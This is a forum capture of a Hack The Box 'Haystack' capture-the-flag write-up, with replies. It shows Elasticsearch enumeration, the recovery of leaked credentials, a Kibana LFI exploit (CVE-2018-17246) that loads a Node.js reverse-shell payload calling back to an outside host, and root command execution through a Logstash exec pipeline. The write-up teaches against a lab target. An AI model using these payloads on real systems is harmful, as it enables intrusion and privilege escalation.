<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Hack The Box - Haystack - Hackthebox Writeups - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="We start by running nmap, with the following options: 

root@flagship:~# nmap -p- -T4 -oN notes -A 10.10.10.115 

I always run it with -p-, which will scan all 65536 ports, rather than just the 1000 most common. And in&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="17303.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Hack The Box - Haystack&#39;" href="17303.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://0x00sec.org/uploads/default/original/2X/2/22087bc90213dba4f6bf2c46d9fe24b3d60906e5.png" />
<meta property="og:image" content="https://0x00sec.org/uploads/default/original/2X/2/22087bc90213dba4f6bf2c46d9fe24b3d60906e5.png" />
<meta property="og:url" content="https://0x00sec.org/t/hack-the-box-haystack/17303" />
<meta name="twitter:url" content="https://0x00sec.org/t/hack-the-box-haystack/17303" />
<meta property="og:title" content="Hack The Box - Haystack" />
<meta name="twitter:title" content="Hack The Box - Haystack" />
<meta property="og:description" content="We start by running nmap, with the following options:   root@flagship:~# nmap -p- -T4 -oN notes -A 10.10.10.115   I always run it with -p-, which will scan all 65536 ports, rather than just the 1000 most common. And in this case, we see a few open ports:  PORT     STATE SERVICE REASON         VERSION                                                                                                                                                                       22/tcp   open  ssh     syn-ack..." />
<meta name="twitter:description" content="We start by running nmap, with the following options:   root@flagship:~# nmap -p- -T4 -oN notes -A 10.10.10.115   I always run it with -p-, which will scan all 65536 ports, rather than just the 1000 most common. And in this case, we see a few open ports:  PORT     STATE SERVICE REASON         VERSION                                                                                                                                                                       22/tcp   open  ssh     syn-ack..." />
<meta property="og:article:section" content="CTF" />
<meta property="og:article:section:color" content="F1592A" />
<meta property="og:article:section" content="Hackthebox Writeups" />
<meta property="og:article:section:color" content="3AB54A" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="4 mins 🕑" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="5 ❤" />
<meta property="article:published_time" content="2019-11-04T15:20:13+00:00" />
<meta property="og:ignore_canonical" content="true" />
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="17303.html">Hack The Box - Haystack</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/ctf/55.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #F1592A"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">CTF</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/ctf/htb-writeups/103.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #3AB54A"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Hackthebox Writeups</span>
</span>
</a>
<meta itemprop="position" content="2" />
</span>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="Hack The Box - Haystack">
<meta itemprop="articleSection" content="Hackthebox Writeups">
<meta itemprop="keywords" content>
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/hostile.node"><span itemprop="name">hostile.node</span></a>
</span>
<link itemprop="mainEntityOfPage" href="17303.html">
<link itemprop="image" href="../../uploads/default/original/2X/2/22087bc90213dba4f6bf2c46d9fe24b3d60906e5.png">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-11-04T15:20:13Z" class="post-time">
November 4, 2019, 3:20pm
</time>
<meta itemprop="dateModified" content="2020-07-06T19:34:45Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<p><img src="../../uploads/default/original/2X/2/22087bc90213dba4f6bf2c46d9fe24b3d60906e5.png" alt data-base62-sha1="4R4ppBzjzDNt2Kqyggs4I3fqZOl" width="589" height="334"></p>
<p>We start by running nmap, with the following options:</p>
<blockquote>
<p>root@flagship:~# nmap -p- -T4 -oN notes -A 10.10.10.115</p>
</blockquote>
<p>I always run it with -p-, which will scan all 65536 ports, rather than just the 1000 most common. And in this case, we see a few open ports:</p>
<pre><code>PORT     STATE SERVICE REASON         VERSION                                                                                                                                                                      
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    syn-ack ttl 63 nginx 1.12.2
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (text/html).
9200/tcp open  http    syn-ack ttl 63 nginx 1.12.2
|_http-favicon: Unknown favicon MD5: 6177BFB75B498E0BB356223ED76FFE43
| http-methods:
|   Supported Methods: HEAD GET DELETE OPTIONS
|_  Potentially risky methods: DELETE
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (application/json; charset=UTF-8).
</code></pre>
<p>On port 80, it’s just a page with an image of a needle in a haystack.</p>
<p>But since this is HTB, it’s worth having a quick look for any steganography. <code>strings</code> doesn’t reveal anything, but <code>xxd</code> does, at the very end of the file:</p>
<pre><code>0002ca80: 8a00 28a2 8a00 28a2 8a00 28a2 8a00 28a2  ..(...(...(...(.
0002ca90: 8a00 28a2 8a00 ffd9 0a62 4745 6759 5764  ..(......bGEgYWd
0002caa0: 3161 6d45 675a 5734 675a 5777 6763 4746  1amEgZW4gZWwgcGF
0002cab0: 7159 5849 675a 584d 6749 6d4e 7359 585a  qYXIgZXMgImNsYXZ
0002cac0: 6c49 673d 3d0a                           lIg==.
</code></pre>
<p>That looks like base64, so let us decode that:</p>
<blockquote>
<p>root@flagship:~# echo bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg== | base64 -d<br>
la aguja en el pajar es “clave”</p>
</blockquote>
<p>Spanish for <em>the needle in the page is “key”</em> or perhaps literally, <em>clave</em> .</p>
<p>Since there doesn’t appear to be anything else to do with the image, let’s have a look at port 9200. If we access it, we get the following:</p>
<pre><code>root@flagship:~/htb/jarvis# curl http://10.10.10.115:9200/
{
  "name" : "iQEYHgS",
  "cluster_name" : "elasticsearch",
  "cluster_uuid" : "pjrX7V_gSFmJY-DxP4tCQg",
  "version" : {
    "number" : "6.4.2",
    "build_flavor" : "default",
    "build_type" : "rpm",
    "build_hash" : "04711c2",
    "build_date" : "2018-09-26T13:34:09.098244Z",
    "build_snapshot" : false,
    "lucene_version" : "7.4.0",
    "minimum_wire_compatibility_version" : "5.6.0",
    "minimum_index_compatibility_version" : "5.0.0"
  },
  "tagline" : "You Know, for Search"
}
</code></pre>
<p>So we’re dealing with an ElasticSearch instance, version 6.4.2. If you aren’t familiar with it, this is a good starting point: <a href="http://joelabrahamsson.com/elasticsearch-101/" rel="noopener nofollow ugc">ElasticSearch 101</a>. However, the relevant part here is that URLs are expected to be in the format of <code>http://10.10.10.115:9200/&lt;index&gt;/&lt;type&gt;/&lt;id&gt;</code> , so we can try to find which indices are available with gobuster:</p>
<pre><code>root@flagship:~# gobuster dir -u http://10.10.10.115:9200/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.115:9200/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/09/07 21:21:02 Starting gobuster
===============================================================
/quotes (Status: 200)
/bank (Status: 200)
</code></pre>
<p>Knowing that the indices <code>quotes</code> and <code>bank</code> exist, we then need to find types which have indices. Gobuster won’t cut it for this, as we want to look for <code>http://10.10.10.115:9200/quotes/&lt;type&gt;/1</code> and <code>http://10.10.10.115:9200/bank/&lt;type&gt;/1</code> , so we turn to wfuzz:</p>
<pre><code>root@flagship:~# wfuzz -u http://10.10.10.115:9200/quotes/FUZZ/1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404
********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************
Target: http://10.10.10.115:9200/quotes/FUZZ/1
Total requests: 220560
==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================
000826:  C=200      0 L       63 W          462 Ch        "quote"
</code></pre>
<p>And then we repeat the same for <code>bank</code>:</p>
<pre><code>root@orbital:~# wfuzz -u http://10.10.10.115:9200/bank/FUZZ/1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404
********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************
Target: http://10.10.10.115:9200/bank/FUZZ/1
Total requests: 220560
==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================
000349:  C=200      0 L        3 W          286 Ch        "account"
</code></pre>
<p>Now that we know two types, we just have to identify what valid ids there are. Again, wfuzz can do this by using a range iterator:</p>
<blockquote>
<p>root@orbital:~# wfuzz -u <a href="http://10.10.10.115:9200/bank/account/FUZZ" rel="noopener nofollow ugc">http://10.10.10.115:9200/bank/account/FUZZ</a> -z range,1-2000 --hc 404<br>
root@orbital:~# wfuzz -u <a href="http://10.10.10.115:9200/quotes/quote/FUZZ" rel="noopener nofollow ugc">http://10.10.10.115:9200/quotes/quote/FUZZ</a> -z range,1-2000 --hc 404</p>
</blockquote>
<p>This will show us that there are 999 valid ids – which we can then download using our trusty curl for further analysis.</p>
<blockquote>
<p>root@flagship:~# curl “<a href="http://10.10.10.115:9200/bank/accounts/%5B1-999%5D" rel="noopener nofollow ugc">http://10.10.10.115:9200/bank/accounts/[1-999]</a>” -o “accounts/<span class="hashtag">#1</span>”<br>
root@flagship:~# curl “<a href="http://10.10.10.115:9200/quotes/quote/%5B1-999%5D" rel="noopener nofollow ugc">http://10.10.10.115:9200/quotes/quote/[1-999]</a>” -o “quotes/<span class="hashtag">#1</span>”</p>
</blockquote>
<p>I didn’t find any useful information in the nearly 2000 files when blindly searching for credentials, but using what we’ve got from the image we get the following:</p>
<blockquote>
<p>root@flagship:~# grep -r clave *<br>
quotes/45.html:{"_index":“quotes”,"_type":“quote”,"_id":“45”,"_version":1,“found”:true,"_source":{“quote”:“Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg “}}<br>
quotes/111.html:{”_index”:“quotes”,"_type":“quote”,"_id":“111”,"_version":1,“found”:true,"_source":{“quote”:“Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=”}}</p>
</blockquote>
<p>With some more base64-looking strings, we decode them as before:</p>
<pre><code>root@flagship:~# echo dXNlcjogc2VjdXJpdHkg | base64 -d
user: security 
root@flagship:~# echo cGFzczogc3BhbmlzaC5pcy5rZXk= | base64 -d
pass: spanish.is.key
</code></pre>
<p>With these credentials, we can login via SSH and grab the user flag.</p>
<blockquote>
<p>root@flagship:~# ssh <a href="../../cdn-cgi/l/email-protection.html#3043555345425944497001001e01001e01001e010105"><span class="__cf_email__" data-cfemail="2c5f494f595e4558556c1d1c021d1c021d1c021d1d19">[email&#160;protected]</span></a><br>
<a href="../../cdn-cgi/l/email-protection.html#3d4e585e484f5449447d0c0d130c0d130c0d130c0c08"><span class="__cf_email__" data-cfemail="1467717761667d606d5425243a25243a25243a252521">[email&#160;protected]</span></a>’s password:<br>
[security@haystack ~]$ ls<br>
user.txt</p>
</blockquote>
<p>Now that we have a foothold, the next step is to run <a href="https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh" rel="noopener nofollow ugc">Linux Smart Enumeration</a> and see if that gives us anything interesting to go on. Thankfully, since we already have SSH access, we can just copy it over with scp rather anything more elaborate.</p>
<p>From a cursory look at the results from LSE, we can see this server is running an ELK stack (<a href="https://www.elastic.co/products/elasticsearch" rel="noopener nofollow ugc">ElasticSearch</a>, <a href="https://www.elastic.co/products/logstash" rel="noopener nofollow ugc">Logstash</a>, <a href="https://www.elastic.co/products/kibana" rel="noopener nofollow ugc">Kibana</a>), with matching user accounts. Additionally, Logstash is running as root and is a likely escalation point.</p>
<p>It also looks like the following ports can be accessed internally: 5601 (Kibana), 9000 and 9300 (both ElasticSearch). 5601 is particularly interesting as it wasn’t available remotely.</p>
<p>Since we know we’re running ElasticSearch 6.4.2, it’s worth checking if there are any issues we can leverage. <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-13554/Elasticsearch.html" rel="noopener nofollow ugc">Looking for vulnerabilities</a> the very first one seems relevant: <a href="https://www.cvedetails.com/cve/CVE-2018-17246/" rel="noopener nofollow ugc">CVE-2018-17246</a> (detailed explanation <a href="https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/" rel="noopener nofollow ugc">here</a>).</p>
<p>It looks like we might get an LFI using this, which would then let us gain access to the kibana user. We can get a viable node reverse shell from <a href="https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell" rel="noopener nofollow ugc">here</a>:</p>
<pre><code>(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "192.168.33.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
</code></pre>
<p>We copy this to haystack (in my case, I copied it to /tmp) and call the vulnerable endpoint:</p>
<pre><code>[security@haystack tmp]$ curl 127.0.0.1:5601/api/console/api_server?apis=../../../../../../../../../../tmp/hn1.js  
</code></pre>
<p>An on our attacking machine we get a callback:</p>
<pre><code>root@flagship:~/shared.node/htb# nc -lvp 1337
listening on [any] 1337 ...
10.10.10.115: inverse host lookup failed: Unknown host
connect to [10.10.16.40] from (UNKNOWN) [10.10.10.115] 52436
whoami
kibana
</code></pre>
<p>And then we upgrade our shell into something a bit more usable:</p>
<pre><code>python -c 'import pty; pty.spawn("/bin/bash")'  
bash-4.2$
</code></pre>
<p>We know that logstash runs as root, so that is probably our way in. The normal flow for a simple ELK stack is that data from ElasticSearch gets processed by LogStash and then presented by Kibana, and we can find that step in <code>/etc/logstash/conf.d</code>. The folder is only accessible now that we are logged in as the kibana user. However, although the files can be read, they can’t be modified.</p>
<h2>input.conf</h2>
<pre><code>input {
         file {
                 path =&gt; "/opt/kibana/logstash_*"
                 start_position =&gt; "beginning"
                 sincedb_path =&gt; "/dev/null"
                 stat_interval =&gt; "10 second"
                 type =&gt; "execute"
                 mode =&gt; "read"
         }
 }
</code></pre>
<h2>filter.conf</h2>
<pre><code>filter {
        if [type] == "execute" {
                grok {
                        match =&gt; { "message" =&gt; "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
                }
        }
}
</code></pre>
<h2>output.conf</h2>
<pre><code>output {
        if [type] == "execute" {
                stdout { codec =&gt; json }
                exec {
                        command =&gt; "%{comando} &amp;"
                }
        }
}
</code></pre>
<p>From reading these files, we can see that it takes input files in the folder /opt/kibana/, with the filename having to start with logstash_. The contents of the file have to be Ejecutar comando : followed by the command we want to execute.</p>
<p>Since we know what we want to get out is the root flag, we can do the following:</p>
<pre><code>bash-4.2$ echo Ejecutar comando : cp /root/root.txt /tmp/root.txt &gt; /tmp/logstash_root
bash-4.2$ echo Ejecutar comando : chmod 777 /tmp/root.txt &gt; logstash_root2
</code></pre>
<p>And within ten seconds our commands will get executed:</p>
<pre><code>bash-4.2$ wc -c /tmp/root.txt&lt;br&gt;
wc -c /tmp/root.txt&lt;br&gt;
33 /tmp/root.txt
</code></pre>
<p>Hopefully this was useful to someone <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="3" />
<span class="post-likes">3 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="17303.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-11-04T21:29:19Z" class="post-time">
November 4, 2019, 9:29pm
</time>
<meta itemprop="dateModified" content="2019-11-04T21:29:19Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Nice writeup!</p>
<p>Thanks for sharing, very concise <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>I’d love more explanation of the root, I struggled with this root and found it from trial and error. Any documentation of logstash itself?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/hostile.node"><span itemprop="name">hostile.node</span></a>
</span>
<link itemprop="mainEntityOfPage" href="17303.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-11-05T09:59:46Z" class="post-time">
November 5, 2019, 9:59am
</time>
<meta itemprop="dateModified" content="2019-11-05T10:04:03Z">
<span itemprop="position">3</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Hey Pry0cc, thanks for the comment.</p>
<p>When I realised ELK was a major stack, I spent some time reading through the documentation of all three components. The <a href="https://www.elastic.co/products/logstash" rel="nofollow noopener">https://www.elastic.co/products/logstash</a> landing page provides a high-level overview regarding how the inputs, filters and outputs fit together.</p>
<p>From there I went into the documentation, <a href="https://www.elastic.co/guide/en/logstash/current/pipeline.html" rel="nofollow noopener">https://www.elastic.co/guide/en/logstash/current/pipeline.html</a>. I can’t say I went into full detail into how each of the plugins in the .conf files work but I’ve been doing dev for quite a few years so I’ve run into a number of domain specific languages, so I understood the general flow of what was happening here.</p>
<p>Broadly:</p>
<h2>input.conf</h2>
<pre><code class="lang-auto">input {
         file { # So, checking for some files?
                 # Which are in /opt/kibana/ and have a filename starting with 
                 # logstash_*
                 path =&gt; "/opt/kibana/logstash_*"
                 # Iterating through all the files in the folder?
                 start_position =&gt; "beginning"
                 sincedb_path =&gt; "/dev/null" # Dunno!
                 # Stat is a POSIX function (https://linux.die.net/man/2/stat) for 
                 # getting information about a file, so it's probably checking every 
                 # file in the directory every 10 seconds to see if it has changed.
                 stat_interval =&gt; "10 second"
                 type =&gt; "execute" # And it's going to be executing something?
                 mode =&gt; "read"
         }
 }
</code></pre>
<h2>filter.conf</h2>
<pre><code class="lang-auto">filter {
        # I guess this is what it is executing! As this is a filter, it means that 
        # all the inputs will come through the filter, and only if they pass the 
        # filter conditions will they get transformed and sent to the output.
        if [type] == "execute" {
                grok {
                        # So, regular expression match test. The message has 
                        # to start with "Ejecutar comando: ",
                        # and then whatever comes after ({GREEDYDATA} gets 
                        # shoved into a variable called "comando".
                        match =&gt; { "message" =&gt; "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
                }
        }
}
</code></pre>
<h2>output.conf</h2>
<pre><code class="lang-auto">output {
        if [type] == "execute" {
                stdout { codec =&gt; json }
                # Anything that passes the filter gets sent into the exec plugin.
                exec {
                        # Which executes whatever is in the "comando" variable 
                        # as a background task.
                        command =&gt; "%{comando} &amp;"
                }
        }
}
</code></pre>
<p>Hopefully that’s helpful <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> Someone who is familiar with Logstash or has spent more time than I going through the documentation can likely point out that some of comments aren’t accurate, but that is the broad shape of what is happening.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_4" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/system"><span itemprop="name">system</span></a>
(system)
Closed
</span>
<link itemprop="mainEntityOfPage" href="17303.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2020-03-05T07:20:17Z" class="post-time">
March 5, 2020, 7:20am
</time>
<meta itemprop="dateModified" content="2020-03-05T07:20:17Z">
<span itemprop="position">4</span>
</span>
</div>
<div class="post" itemprop="text">
<p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script data-cfasync="false" src="../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
